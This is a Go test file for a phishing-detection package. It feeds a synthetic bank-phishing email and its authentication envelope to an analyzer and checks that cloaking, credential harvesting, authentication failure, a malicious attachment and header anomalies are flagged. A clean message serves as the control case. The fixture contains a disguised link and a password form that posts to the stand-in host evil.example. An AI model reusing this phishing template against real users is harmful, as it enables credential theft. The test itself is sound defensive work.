package detect

import (
	"strings"
	"testing"
)

func TestCloakingAndTechniques(t *testing.T) {
	raw := []byte(`From: "Bank" <security@bank.example>
Return-Path: <bounce@other.example>
Content-Type: text/html

<html><body>
<p>Urgent: verify your password and login.</p>
<a href="https://evil.example/login">https://bank.example/login</a>
<a href="https://bit.ly/abc123">Open invoice</a>
<div style="display:none"><a href="https://hidden.example/x">hidden</a></div>
<form action="https://evil.example/collect"><input type="password" name="p"></form>
<img src="https://track.example/pixel.gif" width="1" height="1">
</body></html>`)
	envelode := []byte(`{"messages":[{"from":[{"domain":"bank.example"}],"return_path":{"domain":"other.example"},"authentication":{"spf":[{"result":"fail","domain":"bank.example"}],"dkim":[{"result":"pass","domain":"bank.example"}],"dmarc":[{"result":"fail","domain":"bank.example"}]},"attachments":[{"filename":"invoice.exe","content_type":"application/octet-stream"}]}]}`)
	r := Analyze(raw, envelode)
	counts := r.Counts
	if counts[Cloaking] == 0 {
		t.Fatalf("expected CLOAKING, counts=%v detections=%+v", counts, r.Detections)
	}
	if counts[CredentialHarvest] == 0 || counts[AuthFailure] == 0 || counts[PhishingAttachment] == 0 {
		t.Fatalf("missing techniques: %v", counts)
	}
	if counts[HeaderAnomaly] == 0 {
		t.Fatalf("missing header anomaly: %v", counts)
	}
	md := Markdown(r)
	if !strings.Contains(md, "CLOAKING") || !strings.Contains(md, "Automated Detection Log") {
		t.Fatalf("markdown = %s", md)
	}
}

func TestSimpleMessageNoCloaking(t *testing.T) {
	raw := []byte("From: friend@example.com\nTo: user@example.org\nSubject: lunch\nContent-Type: text/plain\n\nSee you at noon.\n")
	r := Analyze(raw, []byte(`{"messages":[]}`))
	for _, d := range r.Detections {
		if d.Technique == Cloaking {
			t.Fatalf("unexpected cloaking: %+v", d)
		}
	}
}
